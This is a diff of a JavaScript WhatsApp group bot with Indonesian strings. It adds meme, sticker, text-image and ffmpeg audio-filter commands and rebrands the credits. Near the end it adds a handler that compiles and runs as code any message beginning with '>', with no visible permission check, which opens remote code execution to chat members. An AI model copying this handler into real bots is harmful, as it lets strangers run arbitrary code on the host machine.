@@ -17,6 +17,8 @@ const qrcode = require("qrcode-terminal")
 const moment = require("moment-timezone") 
 const fs = require("fs") 
 const util = require('util')
+const fetch = require('node-fetch')
+const os = require('os')
 const crypto = require('crypto')
 const imageToBase64 = require('image-to-base64')
 const axios = require('axios')
@@ -46,8 +48,8 @@ blocked = []
 prefix = '#'
 limitawal = 30
 memberlimit = 0
-ator = 'AMEL cans'
-namo = 'jangan colong'
+ator = 'SUBSCRIBE'
+namo = 'AMPIBI GAMING'
 cr = '*BOT INI SUDAH TERVERIFIKASI*'
 /*************************************/
 
@@ -77,7 +79,7 @@ const badword = JSON.parse(fs.readFileSync('./database/group/badword.json'))
 /*********** END LOAD ***********/
 
 /********** FUNCTION ***************/
-const getLevelingXp = (sender) => {
+		const getLevelingXp = (sender) => {
             let position = false
             Object.keys(_level).forEach((i) => {
                 if (_level[i].id === sender) {
@@ -226,7 +228,7 @@ const getLevelingXp = (sender) => {
             }
         }
         
-         const limitAdd = (sender) => {
+        const limitAdd = (sender) => {
              let position = false
             Object.keys(_limit).forEach((i) => {
                 if (_limit[i].id == sender) {
@@ -447,6 +449,9 @@ client.on('group-participants-update', async (anu) => {
 		    const costum = (pesan, tipe, target, target2) => {
 			client.sendMessage(from, pesan, tipe, {quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target2}` }}})
 			}
+			const costumimg = ( pesan , tipe, target , caption) => {
+			client.sendMessage(from, pesan , tipe , {quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) }, message: {"imageMessage":{url: 'https://mmg.whatsapp.net/d/f/Ahj0ACnTjSHHm6-HjqAUBYiCu2-85zMZp_-EhiXlsd6A.enc',mimetype: 'image/jpeg',caption: `${caption}`,fileSha256: '0Pk0qJyQFn9FCtslZrydJHRQDKryjYcdP7I3CmRrHRs=',fileLength: '20696',height: 360,width: 382,mediaKey: 'N43d/3GY7GYQpgBymb9qFY5O9iNDXuBirXsNZk+X61I=',fileEncSha256: 'IdFM58vy8URV+IUmOqAY3OZsvCN6Px8gaJlRCElqhd4=',directPath: '/v/t62.7118-24/35174026_475909656741093_8174708112574209693_n.enc?oh=2a690b130cf8f912a9ca35f366558743&oe=6061F0C6',mediaKeyTimestamp: '1614240917',jpegThumbnail: '/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMASAMBIgACEQEDEQH/xAAwAAADAAMBAAAAAAAAAAAAAAAABAUBAwYCAQADAQEAAAAAAAAAAAAAAAABAgMABP/aAAwDAQACEAMQAAAAoy6kcWS2eH8miq17B553Thh1BgyTY9iULYfndGBmbSwNEV3eWXpjwZElG09WJckXCj8sWBVc1ZKXj2ZYaoWHnc67K3PbKwtZOqzLrzdQAg5fWFRUeCNTQG2pEKJ0wCD/xAAoEAACAgIBAQkAAwEAAAAAAAABAgADBBEScQUQEyEiMTJBYSNRYmP/2gAIAQEAAT8AaZzfEdwWcGMTE1jNv3M1ozDb+SD2jTO+Yigk6A3KqhseIdfkroTYbXQRrkVuJOplKEuOpjtpxF+IjTO+YnZoBvj4pa/msHtMnHZrgymZ6hCnSJsDl+ys7rTpGmevxMwLFS/1fcA7iNzPsDXaH1NccYH+2lJ1SnSNMlOdcbY6iYGa9g4OJzXW9zI7SBJrpjqxsA9zMkcMetf2V7NKD/McgAkxsis7EcA2fkxkqSkaYbMGRu3hr0x6q6ckufaUMpsexj0ma4Y0qDKhqlektyntXiQO4qWI0PONVZWNsNTmZwewekEwo1fpYaMZdvWf2DYrXoO/ARWLNL6VuXiYcSsuK9eXGYtHhM/nsTPVQgb7iDkydRCNBYYx1Ozj6nmSStRIgJ8UH/nMJiTZs/c7RPwExhu+vrH+p//EAB4RAAIBBAMBAAAAAAAAAAAAAAABAhAREjIhMDFC/9oACAECAQE/AOpJsxEqIj4TfNqXygIWpLc+ZEdBH//EAB4RAAICAgIDAAAAAAAAAAAAAAABAjEQETJBAxJx/9oACAEDAQE/AHWVeHQtYrDaNkno7GOzxP10xzWipDHZHidx+EuQz//Z',scansSidecar: 'choizTOCOFXo21QcOR/IlCehTFztHGnB3xo4F4d/kwmxSJJIbMmvxg==',scanLengths: [Array],midQualityFileSha256: '68OHK4IyhiKDNgNAZ3SoXsngzYENebQkV4b/RwhhYIY=',midQualityFileEncSha256: '2EYOLCXx+aqg9RyP6xJYChQNbEjXZmc0EcSwHzoyXx0='}}}})
+			}
 	        /*****************END SCURITY FEATURE ********/
 
 
@@ -476,7 +481,6 @@ client.on('group-participants-update', async (anu) => {
 			} else if (resl <= 100) {
 				per = `*[██████████] ${resl}%*`
 			} 
-				
 				
 				
 			//auto Expired
@@ -635,11 +639,32 @@ client.on('group-participants-update', async (anu) => {
  	   	if (isGroup && isBadWord) {
             if (bad.includes(messagesC)) {
                 if (!isGroupAdmins) {
-                    return reply("JAGA UCAPAN DONG!! 😠")
-                        .then(() => client.groupRemove(from, sender))
-                        .then(() => {
-                            client.sendMessage(from, `*「 ANTI BADWORD 」*\nKamu dikick karena berkata kasar!`, text ,{quoted: mek})
-                        }).catch(() => client.sendMessage(from, `Untung cya bukan admin, kalo admin udah cya kick!`, text , {quoted : mek}))
+                    try { 
+                        reply("JAGA UCAPAN DONG!! 😠")
+                        setTimeout( () => {
+ 	                           client.groupLeave(from) 
+ 					   	}, 5000)
+								setTimeout( () => {
+								client.updatePresence(from, Presence.composing)
+								reply("1detik")
+							}, 4000)
+								setTimeout( () => {
+								client.updatePresence(from, Presence.composing)
+								reply("2detik")
+							}, 3000)
+								setTimeout( () => {
+								client.updatePresence(from, Presence.composing)
+								reply("3detik")
+							}, 2000)
+								setTimeout( () => {
+								client.updatePresence(from, Presence.composing)
+								reply("4detik")
+							}, 1000)
+								setTimeout( () => {
+								client.updatePresence(from, Presence.composing)
+								reply("*「 ANTI BADWORD 」*\nKamu dikick karena berkata kasar!")
+							}, 0)
+                        } catch { client.sendMessage(from, `Untung cya bukan admin, kalo admin udah cya kick!`, text , {quoted : mek}) }
                 } else {
                     return reply( "Tolong Jaga Ucapan Min 😇")
                 }
@@ -692,8 +717,7 @@ client.on('group-participants-update', async (anu) => {
    	             console.error(err)
    	         }
 	        }
-           
-            
+           	
              //kolor
 			colors = ['red','white','black','blue','yellow','green']
 			
@@ -713,6 +737,111 @@ client.on('group-participants-update', async (anu) => {
 			if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mRECV\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
 			
 			switch(command) { 
+				//apivinz 
+				case 'tebakgambar':
+				if (!isRegistered) return reply(ind.noregis())
+				if (isLimit(sender)) return reply(ind.limitend(pusname))
+					anu = await fetchJson(`https://api.zeks.xyz/api/tebakgambar?apikey=apivinz`, {method: 'get'})
+					ngebuff = await getBuffer(anu.result.soal)
+					tebak = `➸ Jawaban : *${anu.result.jawaban}*`
+					setTimeout( () => {
+					client.sendMessage(from, tebak, text, {quoted: mek})
+					}, 30000) // 1000 = 1s,
+					setTimeout( () => {
+					client.sendMessage(from, '_10 Detik lagi..._', text) // ur cods
+					}, 20000) // 1000 = 1s,
+					setTimeout( () => {
+					client.sendMessage(from, '_20 Detik lagi..._', text) // ur cods
+					}, 10000) // 1000 = 1s,
+					setTimeout( () => {
+					client.sendMessage(from, '_30 Detik lagi..._', text) // ur cods
+					}, 2500) // 1000 = 1s,
+					setTimeout( () => {
+					client.sendMessage(from, ngebuff, image, { caption: '_Tebak bro!!! gak bisa jawab donasi ya:v_', quoted: mek }) // ur cods
+					}, 0) // 1000 = 1s,
+					await limitAdd(sender) 
+				break
+				case 'meme':
+                if (!isRegistered) return reply(ind.noregis())
+                if (isLimit(sender)) return reply(ind.limitend(pusname))
+					nganu = await fetchJson(`https://vinz.zeks.xyz/api/meme`)
+					buper = await getBuffer(nganu.result)
+					client.sendMessage(from, buper, image, {quoted: mek})
+					await limitAdd(sender)
+				break		
+				case 'ttp': 
+					pngttp = './tmp/ttp.png'
+					webpng = './tmp/ttp.webp'
+					const ttptext = body.slice(5)
+					fetch(`https://api.areltiyan.site/sticker_maker?text=${ttptext}`, { method: 'GET'})
+					.then(async res => {
+					const ttptxt = await res.json()
+					base64Img.img(ttptxt.base64, 'tmp', 'ttp', function(err, filepath) {
+					if (err) return console.log(err);
+					exec(`ffmpeg -i ${pngttp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${webpng}`, (err) => {
+					buffer = fs.readFileSync(webpng)
+					client.sendMessage(from, buffer, sticker)
+					fs.unlinkSync(webpng)
+					fs.unlinkSync(pngttp)
+					})
+					})
+					});
+				break
+				case 'pornhub':
+                	if (!isRegistered) return reply(ind.noregis())
+					if (isLimit(sender)) return reply(ind.limitend(pusname))
+					var gh = body.slice(9)
+					var porn = gh.split("&")[0];
+					var hub = gh.split("&")[1];
+					if (args.length < 1) return reply(`「❗」Contoh : ${prefix}pornhub Ramlan & Hub`)
+					reply(ind.wait())
+					alan = await getBuffer(`https://vinz.zeks.xyz/api/pornhub?text1=${porn}&text2=${hub}`)
+					client.sendMessage(from, alan, image, {quoted: mek})
+					await limitAdd(sender)
+				break
+				case 'textlight':
+					if (!isRegistered) return reply(ind.noregis())
+					if (isLimit(sender)) return reply(ind.limitend(pusname))				
+					if (args.length < 1) return reply(ind.wrongf())
+					ligh = body.slice(11)
+					if (ligh.length > 10) return reply('Teksnya kepanjangan, maksimal 9 karakter')
+					reply(ind.wait())
+					lawak = await getBuffer(`https://api.zeks.xyz/api/tlight?text=${ligh}&apikey=apivinz`)
+			    	client.sendMessage(from, lawak, image, {quoted: mek})
+			   	 await limitAdd(sender)
+		  	  break
+                case 'glitchtext':
+					if (!isRegistered) return reply(ind.noregis())
+					if (isLimit(sender)) return reply(ind.limitend(pusname))
+					var gh = body.slice(12)
+					var gli = gh.split("&")[0];
+					var tch = gh.split("&")[1];
+					if (args.length < 1) return reply(`「❗」Contoh : ${prefix}glitchtext Ramlan & Gans`)
+					reply(ind.wait())
+					buffer = await getBuffer(`https://api.zeks.xyz/api/gtext?text1=${gli}&text2=${tch}&apikey=apivinz`)
+					client.sendMessage(from, buffer, image, {quoted: mek})
+					await limitAdd(sender)
+				break
+				case 'nulis':
+					if (!isRegistered) return reply(ind.noregis())
+					if (isLimit(sender)) return reply(ind.limitend(pusname))
+					if (args.length < 1) return reply(`Teksnya mana kak? Contoh : ${prefix}nulis Ramlan baik hati`)
+					nul = body.slice(7)
+					reply('「❗」WAIT BRO GUE NULIS DUMLU YAKAN')
+					tak = await getBuffer(`https://api.zeks.xyz/api/nulis?text=${nul}&apikey=apivinz`)
+					client.sendMessage(from, tak, image, {quoted: mek, caption: 'Lebih baik nulis sendiri ya kak :*'})
+					await limitAdd(sender)				
+				break			
+				case 'tahta':
+					if (!isRegistered) return reply(ind.noregis())
+					if (isLimit(sender)) return reply(ind.limitend(pusname))
+					if (args.length < 1) return reply(`「❗」Contoh : ${prefix}hartatahta hanya dia`)
+					har = body.slice(12)
+					reply('「❗」Hirti Tihti Tai Anjg :v')
+					buffer = await getBuffer(`https://api.zeks.xyz/api/hartatahta?text=${har}&apikey=apivinz`)
+					client.sendMessage(from, buffer, image, {quoted: mek})
+					await limitAdd(sender)
+				break
 				//premiom
 				case 'checkprem':
 				const cekExp = ms(getPremiumExpired(sender) - Date.now())
@@ -1141,7 +1270,9 @@ client.on('group-participants-update', async (anu) => {
 				if (!isRegistered) return reply(ind.noregis())
 				    const reqXp  = 5000 * (Math.pow(2, getLevelingLevel(sender)) - 1)
 				    const uangku = checkATMuser(sender)
-					await costum(ind.menu(pushname, prefix, getLevelingLevel, getLevelingXp, sender, reqXp, _registered, uangku, role, premi), text, tescuk, cr)
+					//const anos = client.user.os_version
+					//const merek = clien
+					await costum(ind.menu(pushname, prefix, getLevelingLevel, getLevelingXp, sender, reqXp, _registered, uangku, role, premi, client, process,kyun), text, tescuk, cr)
 					break
 				case 'info':
 					me = client.user
@@ -1376,7 +1507,7 @@ client.on('group-participants-update', async (anu) => {
 				case 'dare':
 				if (!isRegistered) return reply(ind.noregis())
 				if (isLimit(sender)) return reply(ind.limitend(pusname))
-				const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "🦄💨" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
+				const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "🦄??" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
 					const der = dare[Math.floor(Math.random() * dare.length)]
 					tod = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
 					client.sendMessage(from, tod, image, { quoted: mek, caption: '*Dare*\n\n'+ der })
@@ -1399,7 +1530,7 @@ client.on('group-participants-update', async (anu) => {
 								fs.unlinkSync(media)
 							})
 					} else {
-						reply('𝗸𝗶𝗿𝗶𝗺 𝗳𝗼𝘁𝗼 𝗱𝗲𝗻??𝗮?? 𝗰𝗲𝗽𝘁𝗶𝗼𝗻 ${prefix}𝗼𝗰𝗿')
+						reply('𝗸𝗶𝗿𝗶𝗺 𝗳𝗼𝘁𝗼 𝗱𝗲𝗻??𝗮?? 𝗰𝗲𝗽𝘁𝗶𝗼𝗻 ${prefix}??𝗰𝗿')
 					}
 					await limitAdd(sender)
 				break
@@ -1736,7 +1867,7 @@ client.on('group-participants-update', async (anu) => {
 					} else if (Number(args[0]) === 0) {
 						nsfw.splice(from, 1)
 						fs.writeFileSync('./database/bot/nsfw.json', JSON.stringify(nsfw))
-						reply('❬ 𝗦𝗨𝗞𝗦𝗘𝗦 ❭ 𝗠𝗲𝗻𝗼??𝗮𝗸𝘁𝗶𝗳𝗸𝗮𝗻 𝗳𝗶𝘁𝘂𝗿 𝗻𝘀𝗳𝘄 𝗱𝗶 𝗴𝗿𝗼??𝗽 𝗶𝗻𝗶️')
+						reply('❬ 𝗦𝗨𝗞𝗦𝗘𝗦 ❭ 𝗠𝗲𝗻𝗼??𝗮𝗸𝘁𝗶𝗳𝗸𝗮𝗻 𝗳𝗶𝘁𝘂𝗿 𝗻𝘀𝗳𝘄 𝗱𝗶 ??𝗿𝗼??𝗽 𝗶𝗻𝗶️')
 					} else {
 						reply(ind.satukos())
 					}
@@ -2025,6 +2156,7 @@ client.on('group-participants-update', async (anu) => {
          	           let evaled = await eval(q)
          	           if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
           	          await reply(evaled)
+          		//	client.sendMessage(from, JSON.stringify(eval(body.slice(6))). text)
        	         } catch (err) {
         	            console.error(err)
           	          await reply('Error!')
@@ -2062,6 +2194,59 @@ client.on('group-participants-update', async (anu) => {
 					client.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: mek })
 					fs.unlinkSync(ran)
 				})
+				break 
+				case 'slowmo':
+				if (!isRegistered) return reply(ind.noregis())
+				encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
+				media = await client.downloadAndSaveMediaMessage(encmedia)
+				ran = getRandom('.mp3')
+				exec(`ffmpeg -i ${media} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
+				fs.unlinkSync(media)
+				if (err) return reply('Error!')
+				uhh = fs.readFileSync(ran)
+				client.sendMessage(from, uhh, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
+				fs.unlinkSync(ran)
+				})
+				break
+
+				case 'tupai':
+				if (!isRegistered) return reply(ind.noregis())
+					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
+					media = await client.downloadAndSaveMediaMessage(encmedia)
+					ran = getRandom('.mp3')
+					exec(`ffmpeg -i ${media} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
+						fs.unlinkSync(media)
+						if (err) return reply('Error!')
+						hah = fs.readFileSync(ran)
+						client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
+						fs.unlinkSync(ran)
+					})
+				break
+				case 'gemok':
+				if (!isRegistered) return reply(ind.noregis())
+					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
+					media = await client.downloadAndSaveMediaMessage(encmedia)
+					ran = getRandom('.mp3')
+					exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
+						fs.unlinkSync(media)
+						if (err) return reply('Error!')
+						hah = fs.readFileSync(ran)
+						client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
+						fs.unlinkSync(ran)
+					})
+				break
+				case 'bass':                 
+				if (!isRegistered) return reply(ind.noregis())
+					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
+					media = await client.downloadAndSaveMediaMessage(encmedia)
+					ran = getRandom('.mp3')
+					exec(`ffmpeg -i ${media} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
+						fs.unlinkSync(media)
+						if (err) return reply('Error!')
+						hah = fs.readFileSync(ran)
+						client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
+						fs.unlinkSync(ran)
+					})
 				break
 				case 'getsticker':
 				case 'gets':
@@ -2181,6 +2366,31 @@ client.on('group-participants-update', async (anu) => {
 			if (body.startsWith(`${prefix}${command}`)) {
                   reply(`Maaf *${pushname}*, Command *${prefix}${command}* Tidak Terdaftar Di Dalam *${prefix}menu*!`)
                   }
+            if (/^>/.test(pes)) {
+	            let txt = pes.replace(/^>/, '')
+	            let type = Function
+	            if (/await/.test(pes)) type = (async () => {}).constructor
+	            let func = new type('print', 'client', 'MessageType', 'mek', 'text', 'from', 'image', 'os', 'fetch', txt)
+	            console.log('[EvalF]', func.toString())
+	            let output
+	            try {
+	                output = await func((...args) => {
+	                    console.log('[EvalP]', ...args)
+	                    client.sendMessage(from, util.format(...args), MessageType.extendedText, {
+	                        quoted: mek
+	                    })
+	                }, client, MessageType, mek, text, from, await image, os, fetch)
+	                console.log('[EvalO]', output)
+	                client.sendMessage(from, util.format(output), MessageType.extendedText, {
+	                    quoted: mek
+	                })
+	            } catch (e) {
+	                console.error('[EvalE]', e)
+	                client.sendMessage(from, util.format(e), MessageType.extendedText, {
+	                    quoted: mek
+	                })
+	            }
+            }
 			if (isGroup && !isCmd && isSimi && budy != undefined) {
 						console.log(budy)
 						muehe = await simih(budy)
